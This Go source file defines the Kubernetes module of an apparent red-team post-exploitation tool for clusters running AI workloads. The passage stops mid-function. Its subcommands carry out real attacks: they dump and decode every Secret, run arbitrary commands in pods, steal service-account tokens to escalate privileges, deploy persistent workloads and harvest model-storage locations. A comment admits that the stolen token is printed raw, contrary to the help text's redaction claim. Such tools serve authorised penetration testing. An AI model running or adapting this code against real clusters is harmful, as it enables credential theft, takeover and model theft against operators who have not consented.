package main

import (
	"fmt"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/internal/credchain"
	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/k8s"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	k8sTarget        string
	k8sHeaders       []string
	k8sNamespace     string
	k8sPod           string
	k8sContainer     string
	k8sCommand       []string
	k8sAllNamespaces bool
)

// k8sClientFactory is the injection seam for tests.
var k8sClientFactory = newK8SClient

var k8sCmd = &cobra.Command{
	Use:   "k8s",
	Short: "Enumerate and exploit Kubernetes AI-workload clusters",
	Long: `Probe a Kubernetes API server hosting ML/AI workloads. Read-only verbs
enumerate workloads and custom resources (enum), assess anonymous/unauthenticated
RBAC posture (rbac-probe), and map the current identity's authorization (access-review).
Active verbs exfiltrate Secrets (secret-read), harvest model-artifact locations
(artifact-read), execute commands in pods (pod-exec), and steal a pod's service-account
token to escalate to a more-privileged identity (sa-loot); these require --force-exploit.

Scope is a single API server, but it traverses identities and namespaces WITHIN that
cluster: enum/secret-read take --all-namespaces, and sa-loot steals a pod's SA token and
re-authenticates as it. It stops at the cluster boundary (no cross-cluster / cluster-mesh
movement). k3s and most clusters serve a self-signed apiserver cert — pass --insecure.`,
	Example: strings.Join([]string{
		formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure rbac-probe"),
		formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure enum --all-namespaces"),
		formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure access-review --namespace ml-prod"),
		formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure secret-read --all-namespaces --force-exploit"),
		formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure sa-loot --namespace ml-prod --force-exploit"),
		formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure pod-exec --namespace ml-prod --command id --force-exploit"),
	}, "\n"),
}

var k8sEnumCmd = &cobra.Command{
	Use:   "enum",
	Short: "Enumerate Kubernetes workloads and custom resources",
	Long: `Enumerate cluster workloads (pods, deployments, services, configmaps) and
custom resources.

Maps what is actually running, and on an ML cluster the custom resources are the
prize: InferenceServices, notebooks, and pipeline objects that name models,
image registries, and storage. Use --all-namespaces for a cluster-wide view.
ConfigMaps are read here too, and frequently carry configuration secrets.

This is a read-only probing operation.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure enum --namespace ml-prod"),
	RunE:    runK8SEnum,
}

var k8sRBACProbeCmd = &cobra.Command{
	Use:   "rbac-probe",
	Short: "Assess anonymous / unauthenticated API access",
	Long: `Send credential-free reads to sensitive API endpoints (namespaces, secrets,
pods, deployments) and classify the result: anonymous-open (200 without credentials —
a real weakness), auth-enforced (uniform 401 — the honest not-weak signal), or
authenticated-restricted (403, an anonymous identity exists but RBAC denies the
resource). Safe and read-only; no --force-exploit required.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure rbac-probe"),
	RunE:    runK8SRBACProbe,
}

var k8sSecretReadCmd = &cobra.Command{
	Use:   "secret-read",
	Short: "Exfiltrate and decode Secrets from a namespace (requires --force-exploit)",
	Long: `List every Secret in --namespace and base64-decode its data to plaintext.
Recovering credentials is an active exfiltration step, so it requires --force-exploit.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure secret-read --namespace ml-prod --force-exploit"),
	RunE:    runK8SSecretRead,
}

var k8sArtifactReadCmd = &cobra.Command{
	Use:   "artifact-read",
	Short: "Harvest model-artifact locations from cluster metadata (requires --force-exploit)",
	Long: `Read ConfigMaps and InferenceService specs in --namespace to recover model
names, registry endpoints, and object-store storageUris — the coordinates an attacker
needs to pull proprietary models. Requires --force-exploit.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure artifact-read --namespace ml-prod --force-exploit"),
	RunE:    runK8SArtifactRead,
}

var k8sPodExecCmd = &cobra.Command{
	Use:   "pod-exec",
	Short: "Execute a command inside a pod (requires --force-exploit)",
	Long: `Open an exec stream (WebSocket v5.channel.k8s.io) into a pod and run --command.
If --pod is omitted, the first pod in --namespace is targeted. Arbitrary in-pod
command execution is the takeover step, so it requires --force-exploit.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure pod-exec --namespace ml-prod --command id --force-exploit"),
	RunE:    runK8SPodExec,
}

var k8sAccessReviewCmd = &cobra.Command{
	Use:   "access-review",
	Short: "Map what the current identity is authorized to do (SelfSubjectRulesReview)",
	Long: `Ask the API server, as the current identity (anonymous, or a token via --header
'Authorization: Bearer <jwt>'), exactly what it can do in --namespace — a precise
authorization map, not a probe-by-request heuristic. An unauthenticated caller that
cannot self-review (401/403) is reported honestly as such. Read-only; no --force-exploit.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure access-review --namespace ml-prod"),
	RunE:    runK8SAccessReview,
}

var k8sSALootCmd = &cobra.Command{
	Use:   "sa-loot",
	Short: "Steal a pod's service-account token and escalate to its identity (requires --force-exploit)",
	Long: `Exec into a pod (--pod, or the first pod in --namespace), read its mounted
service-account token, re-authenticate to the API server as that ServiceAccount, and
map what it can do (SelfSubjectRulesReview). If the stolen identity can write
(create/update/delete) where the anonymous foothold is read-only, that is a privilege
escalation. Lateral movement WITHIN the cluster (steal + re-auth); requires
--force-exploit. The captured token is redacted from output.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure sa-loot --namespace ml-prod --force-exploit"),
	RunE:    runK8SSALoot,
}

var k8sPersistCmd = &cobra.Command{
	Use:   "persist",
	Short: "Deploy a bounded persistence workload with the current/stolen identity (requires --force-exploit)",
	Long: `Deploy a bounded, benign, self-healing Deployment (a labelled busybox canary that
prints a marker then sleeps — no reverse shell, no host access) under the current or
stolen identity, then confirm the cluster runs it. This proves persistence: a workload
the cluster keeps alive across restarts. Steal a token first with sa-loot and pass it
via --header "Authorization: Bearer <token>". Clean up with kubectl delete deployment
aipostex-persist. Requires --force-exploit.`,
	Example: formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure persist --namespace ml-prod --force-exploit"),
	RunE:    runK8SPersist,
}

func init() {
	k8sCmd.PersistentFlags().StringVarP(&k8sTarget, "target", "t", "", "Kubernetes API server URL, e.g. https://host:6443 (required)")
	k8sCmd.PersistentFlags().StringSliceVar(&k8sHeaders, "header", nil, "Additional HTTP header(s) in 'Key: Value' format (e.g. a bearer token)")
	k8sCmd.PersistentFlags().StringVar(&k8sNamespace, "namespace", "default", "Kubernetes namespace to target")

	k8sPodExecCmd.Flags().StringVar(&k8sPod, "pod", "", "Pod name to exec into (default: first pod in the namespace)")
	k8sPodExecCmd.Flags().StringVar(&k8sContainer, "container", "", "Container name (default: the pod's first/default container)")
	k8sPodExecCmd.Flags().StringSliceVar(&k8sCommand, "command", []string{"id"}, "Command to run in the pod (comma-separated argv)")

	k8sEnumCmd.Flags().BoolVarP(&k8sAllNamespaces, "all-namespaces", "A", false, "Enumerate across every readable namespace")
	k8sSecretReadCmd.Flags().BoolVarP(&k8sAllNamespaces, "all-namespaces", "A", false, "Read Secrets across every readable namespace")

	k8sSALootCmd.Flags().StringVar(&k8sPod, "pod", "", "Pod whose service-account token to steal (default: first pod in the namespace)")
	k8sSALootCmd.Flags().StringVar(&k8sContainer, "container", "", "Container name (default: the pod's first/default container)")

	k8sCmd.AddCommand(
		k8sEnumCmd,
		k8sRBACProbeCmd,
		k8sAccessReviewCmd,
		k8sSecretReadCmd,
		k8sArtifactReadCmd,
		k8sPodExecCmd,
		k8sSALootCmd,
		k8sPersistCmd,
	)
}

func newK8SClient() (*k8s.Client, error) {
	if strings.TrimSpace(k8sTarget) == "" {
		return nil, missingFlagError("target", formatCommandExample("k8s --target https://127.0.0.1:6443 --insecure rbac-probe"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(k8sHeaders)
	if err != nil {
		return nil, err
	}
	target := normalizeAndWarnTarget(k8sTarget)
	k8sTarget = target
	client, err := k8s.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	client.HTTPClient = httpClient
	client.ForceExploit = cfg.ForceExploit
	client.Insecure = cfg.Insecure
	return client, nil
}

func runK8SEnum(cmd *cobra.Command, args []string) error {
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}

	namespaces, nsErr := k8sTargetNamespaces(client)
	if nsErr != nil {
		return fmt.Errorf("resolving namespaces: %w", outcomeAnnotate(nsErr))
	}
	var workloads []k8s.Workload
	var wlErr error
	for _, ns := range namespaces {
		w, e := client.EnumerateWorkloads(ns)
		workloads = append(workloads, w...)
		if e != nil && wlErr == nil {
			wlErr = e
		}
	}
	crds, crdErr := client.EnumerateCRDs()
	if len(workloads) == 0 && len(crds) == 0 {
		if wlErr != nil {
			return fmt.Errorf("enumerating workloads in %s: %w", k8sNamespaceScope(), outcomeAnnotate(wlErr))
		}
		if crdErr != nil {
			return fmt.Errorf("enumerating CRDs: %w", outcomeAnnotate(crdErr))
		}
	}

	findings := make([]report.Finding, 0, len(workloads)+len(crds)+1)
	summary := newExploitFinding(
		report.SourceK8s,
		k8sTarget,
		fmt.Sprintf("Kubernetes workloads enumerated: %d in %s", len(workloads), k8sNamespaceScope()),
		k8sEnumSeverity(len(workloads), len(crds)),
		fmt.Sprintf("Enumerated %d workload(s) across %d namespace(s) and %d cluster CRD(s) from the API server.", len(workloads), len(namespaces), len(crds)),
		map[string]interface{}{
			"module":          "k8s",
			"action":          "enum",
			"provider":        "k8s",
			"mutating":        false,
			"namespace":       k8sNamespaceScope(),
			"namespace_count": len(namespaces),
			"workload_count":  len(workloads),
			"crd_count":       len(crds),
		},
	)
	// Best-effort cluster version (anonymous /version is allowed on open clusters).
	if v, verr := client.Version(); verr == nil && v.GitVersion != "" {
		summary.Metadata["version"] = v.GitVersion
	}
	summary.Evidence = k8sEnumEvidence(workloads, crds)
	summary.Metadata = applyStageLanded(summary.Metadata, "recon", "reachable", "k8s-enum", "workloads", "crds")
	enumPlan := buildK8sEnumWorkflowPlan(k8sTarget, namespaces, workloads)
	summary.Metadata = attachWorkflowToMetadata(summary.Metadata, enumPlan)
	findings = append(findings, summary)

	for _, wl := range workloads {
		f := newExploitFinding(
			report.SourceK8s,
			k8sTarget,
			fmt.Sprintf("Kubernetes %s discovered: %s", wl.Kind, wl.Name),
			report.SeverityInfo,
			fmt.Sprintf("%s %q in namespace %q%s", wl.Kind, wl.Name, wl.Namespace, imageSuffix(wl.Image)),
			map[string]interface{}{
				"module":    "k8s",
				"action":    "enum",
				"provider":  "k8s",
				"mutating":  false,
				"namespace": wl.Namespace,
				"workload":  wl.Name,
				"kind":      wl.Kind,
				"image":     wl.Image,
			},
		)
		f.Metadata = applyStageLanded(f.Metadata, "access", "reachable", "k8s-enum", strings.ToLower(wl.Kind))
		findings = append(findings, f)
	}

	for _, crd := range crds {
		if !mlRelevantCRD(crd.Group) {
			continue
		}
		f := newExploitFinding(
			report.SourceK8s,
			k8sTarget,
			fmt.Sprintf("Kubernetes ML custom resource exposed: %s", crd.Kind),
			report.SeverityLow,
			fmt.Sprintf("CRD %q (group %s, kind %s) indicates an ML serving/orchestration platform on this cluster.", crd.Name, crd.Group, crd.Kind),
			map[string]interface{}{
				"module":   "k8s",
				"action":   "enum",
				"provider": "k8s",
				"mutating": false,
				"crd":      crd.Name,
				"crd_kind": crd.Kind,
			},
		)
		f.Metadata = applyStageLanded(f.Metadata, "access", "reachable", "k8s-enum", "crd")
		findings = append(findings, f)
	}

	infof("Enumerated %d workload(s) and %d CRD(s) in %s", len(workloads), len(crds), k8sNamespaceScope())
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "k8s",
		Action:              "enum",
		ResourcesEnumerated: len(workloads) + len(crds),
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{enumPlan},
	})
}

func runK8SRBACProbe(cmd *cobra.Command, args []string) error {
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}
	res, err := client.ProbeRBAC()
	if err != nil {
		return fmt.Errorf("probing RBAC: %w", outcomeAnnotate(err))
	}

	severity := report.SeverityInfo
	landed := "reachable"
	title := fmt.Sprintf("Kubernetes RBAC posture: %s (access enforced)", res.Posture)
	desc := fmt.Sprintf("No sensitive resource was readable without authorization (posture=%s). The API server enforces authentication — not weak to anonymous access.", res.Posture)
	if res.AnonAccessible {
		severity = report.SeverityHigh
		landed = "influenced"
		access := "anonymous"
		if res.Authenticated {
			access = "the supplied credentials"
		}
		title = "Kubernetes API allows unauthenticated read access"
		desc = fmt.Sprintf("Sensitive API resources (namespaces/secrets/pods) are readable with %s — RBAC permits over-broad reads (posture=%s). This enables workload and credential discovery without authentication.", access, res.Posture)
	}

	finding := newExploitFinding(
		report.SourceK8s,
		k8sTarget,
		title,
		severity,
		desc,
		map[string]interface{}{
			"module":            "k8s",
			"action":            "rbac-probe",
			"provider":          "k8s",
			"mutating":          false,
			"posture":           res.Posture,
			"anon_accessible":   res.AnonAccessible,
			"unauth_accessible": res.UnAuthAccessible,
			"authenticated":     res.Authenticated,
		},
	)
	finding.Evidence = res.Evidence
	finding.Metadata = applyStageLanded(finding.Metadata, "access", landed, "k8s-rbac-probe", "rbac")
	k8sPlan := buildK8sExploitWorkflowPlan(k8sTarget, "rbac-probe", k8sNamespace)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, k8sPlan)

	infof("RBAC probe: posture=%s anon_accessible=%v", res.Posture, res.AnonAccessible)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "k8s",
		Action:              "rbac-probe",
		ResourcesEnumerated: len(res.Probes),
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{k8sPlan},
	})
}

func runK8SSecretRead(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("k8s secret-read"); err != nil {
		return err
	}
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}
	namespaces, nsErr := k8sTargetNamespaces(client)
	if nsErr != nil {
		return fmt.Errorf("resolving namespaces: %w", outcomeAnnotate(nsErr))
	}
	var secrets []k8s.SecretInfo
	var firstErr error
	for _, ns := range namespaces {
		s, e := client.ReadSecrets(ns)
		secrets = append(secrets, s...)
		if e != nil && firstErr == nil {
			firstErr = e
		}
	}
	if len(secrets) == 0 {
		if firstErr != nil {
			return fmt.Errorf("reading secrets in %s: %w", k8sNamespaceScope(), outcomeAnnotate(firstErr))
		}
		infof("No secrets present in %s", k8sNamespaceScope())
		return writeExploitFindingsWithSummary(nil, &exploitSummary{Module: "k8s", Action: "secret-read", Mutating: true})
	}

	findings := make([]report.Finding, 0, len(secrets))
	for _, secret := range secrets {
		// Honest framing: a Secret with no readable data keys was read but yielded
		// no credential material — don't claim plaintext exfiltration for it.
		severity := report.SeverityCritical
		stage, strength := "impact", "read-confirmed"
		title := fmt.Sprintf("Kubernetes secret exfiltrated: %s/%s", secret.Namespace, secret.Name)
		desc := fmt.Sprintf("Secret %q (type=%s) in namespace %q exposed %d key(s); values were base64-decoded to plaintext.", secret.Name, secret.Type, secret.Namespace, len(secret.Keys))
		if len(secret.Keys) == 0 {
			severity = report.SeverityHigh
			stage, strength = "correlation", "reachable"
			title = fmt.Sprintf("Kubernetes secret readable (no data keys): %s/%s", secret.Namespace, secret.Name)
			desc = fmt.Sprintf("Secret %q (type=%s) in namespace %q was readable without authorization but exposed no data keys.", secret.Name, secret.Type, secret.Namespace)
		}
		f := newExploitFinding(
			report.SourceK8s,
			k8sTarget,
			title,
			severity,
			desc,
			map[string]interface{}{
				"module":      "k8s",
				"action":      "secret-read",
				"provider":    "k8s",
				"mutating":    false,
				"namespace":   secret.Namespace,
				"secret_name": secret.Name,
				"key_count":   len(secret.Keys),
			},
		)
		f.Evidence = secretEvidence(secret)
		f.Metadata = applyStageLanded(f.Metadata, stage, strength, "k8s-secret-read", "secret")
		// Surface each exfiltrated key as a structured credential so the console
		// renders a complete, aligned creds: block (and `report view --credentials`
		// lists it) instead of hiding the values behind a truncated evidence preview.
		// chainable:false: the values are loot keyed to their source secret, not a
		// verified hop against a downstream target, so they don't drive Next Actions.
		if creds := secretCredentials(secret, k8sTarget); len(creds) > 0 {
			f.Metadata["extracted_credentials"] = creds
		}
		findings = append(findings, f)
	}

	infof("Exfiltrated %d secret(s) from %s", len(secrets), k8sNamespaceScope())
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "k8s",
		Action:              "secret-read",
		ResourcesEnumerated: len(secrets),
		Mutating:            false,
	})
}

func runK8SArtifactRead(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("k8s artifact-read"); err != nil {
		return err
	}
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}
	artifacts, err := client.ReadArtifacts(k8sNamespace)
	if err != nil {
		return fmt.Errorf("reading artifacts in %q: %w", k8sNamespace, outcomeAnnotate(err))
	}
	if len(artifacts) == 0 {
		infof("No model-artifact references found in namespace %q", k8sNamespace)
		return writeExploitFindingsWithSummary(nil, &exploitSummary{Module: "k8s", Action: "artifact-read", Mutating: false})
	}

	findings := make([]report.Finding, 0, len(artifacts))
	for _, art := range artifacts {
		f := newExploitFinding(
			report.SourceK8s,
			k8sTarget,
			fmt.Sprintf("Kubernetes model-artifact reference exposed: %s", art.Name),
			report.SeverityHigh,
			fmt.Sprintf("%s %q in namespace %q reveals model-artifact location/configuration data.", art.Source, art.Name, k8sNamespace),
			map[string]interface{}{
				"module":          "k8s",
				"action":          "artifact-read",
				"provider":        "k8s",
				"mutating":        false,
				"namespace":       k8sNamespace,
				"artifact":        art.Name,
				"artifact_source": art.Source,
			},
		)
		f.Evidence = art.Preview
		f.Metadata = applyStageLanded(f.Metadata, "impact", "read-confirmed", "k8s-artifact-read", "artifact")
		findings = append(findings, f)
	}

	infof("Harvested %d model-artifact reference(s) from %s", len(artifacts), k8sNamespace)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "k8s",
		Action:              "artifact-read",
		ResourcesEnumerated: len(artifacts),
		Mutating:            false,
	})
}

func runK8SPodExec(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("k8s pod-exec"); err != nil {
		return err
	}
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}

	pod := strings.TrimSpace(k8sPod)
	if pod == "" {
		discovered, derr := firstPodInNamespace(client, k8sNamespace)
		if derr != nil {
			return fmt.Errorf("auto-selecting a pod in %q: %w", k8sNamespace, outcomeAnnotate(derr))
		}
		pod = discovered
		infof("No --pod given; targeting first pod %q", pod)
	}

	res, err := client.ExecInPod(k8sNamespace, pod, k8sContainer, k8sCommand)
	command := strings.Join(k8sCommand, " ")
	if err != nil {
		// The exec stream could not be opened (e.g. 401/403, or no exec grant).
		// Report honestly as reachable-but-not-executed rather than claiming RCE.
		finding := newExploitFinding(
			report.SourceK8s,
			k8sTarget,
			fmt.Sprintf("Kubernetes pod-exec denied: %s/%s", k8sNamespace, pod),
			report.SeverityMedium,
			fmt.Sprintf("Exec stream to pod %q in %q could not be opened (%v) — command execution was not achieved.", pod, k8sNamespace, outcomeAnnotate(err)),
			map[string]interface{}{
				"module": "k8s", "action": "pod-exec", "provider": "k8s", "mutating": true,
				"namespace": k8sNamespace, "pod": pod, "container": k8sContainer, "command": command,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "own", "reachable", "k8s-pod-exec", "command-execution")
		return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
			Module: "k8s", Action: "pod-exec", ResourcesEnumerated: 1, Mutating: true,
		})
	}

	stdout := strings.TrimSpace(res.Stdout)
	output := strings.TrimSpace(res.Stdout + res.Stderr) // evidence blob (stdout + stderr)
	var severity, landed, title, desc string
	switch {
	case stdout != "" && !res.IsError:
		// The requested command produced stdout and the stream closed cleanly —
		// confirmed in-pod RCE. Only this rung claims `exploited`.
		severity = report.SeverityCritical
		landed = "execution-confirmed"
		title = fmt.Sprintf("Kubernetes arbitrary pod execution: %s/%s", k8sNamespace, pod)
		desc = fmt.Sprintf("Command %q executed in pod %q (container %s); the API server streamed back its stdout — full in-pod RCE.", command, pod, defaultLabel(k8sContainer, "default"))
	case res.IsError:
		// The apiserver returned a Failure status: the command executed but exited
		// non-zero. Execution is proven; we just did not get a clean success.
		severity = report.SeverityHigh
		landed = "execution-confirmed"
		title = fmt.Sprintf("Kubernetes pod-exec executed (non-zero exit): %s/%s", k8sNamespace, pod)
		desc = fmt.Sprintf("Command %q ran in pod %q but exited non-zero; the exec channel is reachable and executing.", command, pod)
	default:
		// Stream opened but produced no stdout (stderr-only, or truncated before a
		// terminal status): do not over-claim execution.
		severity = report.SeverityHigh
		landed = "reachable"
		title = fmt.Sprintf("Kubernetes pod-exec stream opened, no stdout: %s/%s", k8sNamespace, pod)
		desc = fmt.Sprintf("An exec stream to pod %q opened but returned no stdout for %q (execution not confirmed).", pod, command)
	}

	finding := newExploitFinding(
		report.SourceK8s,
		k8sTarget,
		title,
		severity,
		desc,
		map[string]interface{}{
			"module": "k8s", "action": "pod-exec", "provider": "k8s", "mutating": true,
			"namespace": k8sNamespace, "pod": pod, "container": k8sContainer, "command": command,
		},
	)
	finding.Evidence = output
	finding.Metadata = applyStageLanded(finding.Metadata, "own", landed, "k8s-pod-exec", "command-execution")
	k8sPlan := buildK8sExploitWorkflowPlan(k8sTarget, "pod-exec", k8sNamespace)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, k8sPlan)

	infof("pod-exec %s in %s/%s: %d byte(s) output", command, k8sNamespace, pod, len(output))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module: "k8s", Action: "pod-exec", ResourcesEnumerated: 1, Mutating: true,
		WorkflowPlans: []workflowPlan{k8sPlan},
	})
}

func runK8SAccessReview(cmd *cobra.Command, args []string) error {
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}
	review, err := client.SelfSubjectRulesReview(k8sNamespace)
	if err != nil {
		return fmt.Errorf("access-review in %q: %w", k8sNamespace, outcomeAnnotate(err))
	}

	identity := "anonymous/unauthenticated"
	if review.Authenticated {
		identity = "the supplied identity"
	}

	if !review.Reviewed {
		finding := newExploitFinding(
			report.SourceK8s, k8sTarget,
			fmt.Sprintf("Kubernetes access-review denied for %s (HTTP %d)", identity, review.Status),
			report.SeverityInfo,
			fmt.Sprintf("%s could not self-review its authorization in %q (SelfSubjectRulesReview returned HTTP %d) — typically a system:anonymous caller. Supply --header \"Authorization: Bearer <token>\" to map an authenticated identity.", identity, k8sNamespace, review.Status),
			map[string]interface{}{
				"module": "k8s", "action": "access-review", "provider": "k8s", "mutating": false,
				"namespace": k8sNamespace, "authenticated": review.Authenticated, "can_write": false,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "access", "reachable", "k8s-access-review", "rbac")
		infof("access-review: %s cannot self-review (HTTP %d)", identity, review.Status)
		return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
			Module: "k8s", Action: "access-review", ResourcesEnumerated: 0, Mutating: false,
		})
	}

	severity := report.SeverityMedium
	if review.CanWrite {
		severity = report.SeverityHigh
	}
	incompleteNote := ""
	if review.Incomplete {
		// The apiserver couldn't fully enumerate the rules (a non-RBAC authorizer in
		// the chain); the set is a lower bound, so don't assert a hard read-only.
		incompleteNote = " The review was INCOMPLETE (a non-RBAC authorizer is present), so these capabilities are a lower bound and write may be under-reported."
	}
	finding := newExploitFinding(
		report.SourceK8s, k8sTarget,
		fmt.Sprintf("Kubernetes identity authorization mapped: %d rule(s) in %s%s", len(review.Rules), k8sNamespace, writeSuffix(review.CanWrite)),
		severity,
		fmt.Sprintf("%s can perform %d distinct verb(s) over %d resource type(s) in %q (write=%v, exec=%v). Verbs: %s.%s", identity, len(review.Verbs), len(review.Resources), k8sNamespace, review.CanWrite, review.CanExec, strings.Join(review.Verbs, ","), incompleteNote),
		map[string]interface{}{
			"module": "k8s", "action": "access-review", "provider": "k8s", "mutating": false,
			"namespace": k8sNamespace, "authenticated": review.Authenticated,
			"can_write": review.CanWrite, "can_exec": review.CanExec, "rule_count": len(review.Rules),
			"review_incomplete": review.Incomplete,
		},
	)
	finding.Evidence = review.Evidence
	finding.Metadata = applyStageLanded(finding.Metadata, "access", "read-confirmed", "k8s-access-review", "rbac")
	k8sPlan := buildK8sExploitWorkflowPlan(k8sTarget, "access-review", k8sNamespace)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, k8sPlan)
	infof("access-review: %d rule(s), can_write=%v", len(review.Rules), review.CanWrite)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module: "k8s", Action: "access-review", ResourcesEnumerated: len(review.Rules), Mutating: false,
		WorkflowPlans: []workflowPlan{k8sPlan},
	})
}

func runK8SSALoot(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("k8s sa-loot"); err != nil {
		return err
	}
	client, err := k8sClientFactory()
	if err != nil {
		return err
	}
	pod := strings.TrimSpace(k8sPod)
	if pod == "" {
		discovered, derr := firstPodInNamespace(client, k8sNamespace)
		if derr != nil {
			return fmt.Errorf("auto-selecting a pod in %q: %w", k8sNamespace, outcomeAnnotate(derr))
		}
		pod = discovered
		infof("No --pod given; looting first pod %q", pod)
	}

	token, err := client.ReadServiceAccountToken(k8sNamespace, pod, k8sContainer)
	if err != nil {
		// Exec denied or no token mounted — report honestly, no escalation claim.
		finding := newExploitFinding(
			report.SourceK8s, k8sTarget,
			fmt.Sprintf("Kubernetes SA-token theft failed: %s/%s", k8sNamespace, pod),
			report.SeverityMedium,
			fmt.Sprintf("Could not read a service-account token from pod %q in %q (%v) — token theft not achieved.", pod, k8sNamespace, outcomeAnnotate(err)),
			map[string]interface{}{
				"module": "k8s", "action": "sa-loot", "provider": "k8s", "mutating": true,
				"namespace": k8sNamespace, "pod": pod, "token_stolen": false, "escalation": false,
			},
		)
		finding.Metadata = applyStageLanded(finding.Metadata, "own", "reachable", "k8s-sa-loot", "service-account-token")
		return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
			Module: "k8s", Action: "sa-loot", ResourcesEnumerated: 1, Mutating: true,
		})
	}

	// Measure a real privilege DELTA with a non-persisting dry-run create: does the
	// stolen identity gain WRITE where the foothold identity is denied? (We never
	// assume the foothold is read-only — we probe it.) SSRR is a best-effort rule map
	// for evidence; the escalation decision rests on the write-probe.
	stolen := client.WithBearerToken(token)
	footholdWrite, footholdStatus, footholdOK := client.CanCreate(k8sNamespace)
	stolenWrite, _, stolenOK := stolen.CanCreate(k8sNamespace)
	review, _ := stolen.SelfSubjectRulesReview(k8sNamespace)

	escalation := stolenOK && stolenWrite && footholdOK && !footholdWrite
	severity := report.SeverityHigh
	strength := "read-confirmed"
	var title, desc string
	switch {
	case escalation:
		severity = report.SeverityCritical
		// Stolen-token-with-write proves takeover capability (a standing, re-authable
		// write identity), not code execution — reserve execution-confirmed for RCE.
		strength = "takeover-capable"
		title = fmt.Sprintf("Kubernetes privilege escalation: stolen SA token grants write the foothold lacks (%s/%s)", k8sNamespace, pod)
		desc = fmt.Sprintf("Stole the service-account token from pod %q and re-authenticated; a non-persisting dry-run create confirmed the stolen identity can WRITE where the foothold identity is denied (HTTP %d). The write was not persisted.%s", pod, footholdStatus, verbsSuffix(review))
	case stolenOK && stolenWrite && footholdOK && footholdWrite:
		title = fmt.Sprintf("Kubernetes service-account token stolen (no privilege gain): %s/%s", k8sNamespace, pod)
		desc = fmt.Sprintf("Stole and re-authenticated with the service-account token from pod %q; the identity can write, but the foothold can already write too — no privilege gain.", pod)
	case stolenOK && !stolenWrite:
		title = fmt.Sprintf("Kubernetes service-account token stolen (read-only, no escalation): %s/%s", k8sNamespace, pod)
		desc = fmt.Sprintf("Stole and re-authenticated with the service-account token from pod %q; the identity cannot create (write), so it grants no write beyond the foothold.", pod)
	default:
		title = fmt.Sprintf("Kubernetes service-account token stolen (delta unconfirmed): %s/%s", k8sNamespace, pod)
		desc = fmt.Sprintf("Stole a service-account token from pod %q, but the write-capability probe was inconclusive, so a privilege delta could not be confirmed.", pod)
	}
	if review.Incomplete {
		desc += " (The stolen identity's rule review was incomplete, so its capabilities may be under-reported.)"
	}

	finding := newExploitFinding(
		report.SourceK8s, k8sTarget, title, severity, desc,
		map[string]interface{}{
			"module": "k8s", "action": "sa-loot", "provider": "k8s", "mutating": true,
			"namespace": k8sNamespace, "pod": pod,
			"token_stolen": true, "escalation": escalation,
			"sa_can_write": stolenWrite, "foothold_can_write": footholdWrite,
		},
	)
	// Surface the RAW stolen credential — the operator needs the actual token to re-authenticate
	// and pivot (no redaction; secrets in evidence are intentional) — plus the measured
	// write-capability delta + rule map.
	evidence := fmt.Sprintf("Captured service-account token: %s\nWrite-capability (dry-run create): foothold=%s, stolen=%s",
		token, writeLabel(footholdOK, footholdWrite), writeLabel(stolenOK, stolenWrite))
	if review.Reviewed && strings.TrimSpace(review.Evidence) != "" {
		evidence += "\nStolen identity rules:\n" + review.Evidence
	}
	finding.Evidence = evidence
	finding.Metadata = applyStageLanded(finding.Metadata, "own", strength, "k8s-sa-loot", "service-account-token")
	// Emit the token as an actionable credential so it flows into the creds block, the
	// -o/dossier credential index, and loot/commands.sh (k8s-sa-token follow-ons re-auth with it).
	// The SA token IS a chainable pivot (re-auth -> access-review / secret-read). lootCredentialRecord
	// defaults chainable=false, so mark it chainable — credchain.ExtractFromFindings (which drives the
	// dossier loot/commands.sh) skips non-chainable structured records, so without this the promised
	// k8s-sa-token follow-ons never reach commands.sh.
	saCred := lootCredentialRecord(
		"k8s-sa-token", fmt.Sprintf("%s/%s service-account token", k8sNamespace, pod), token, k8sTarget,
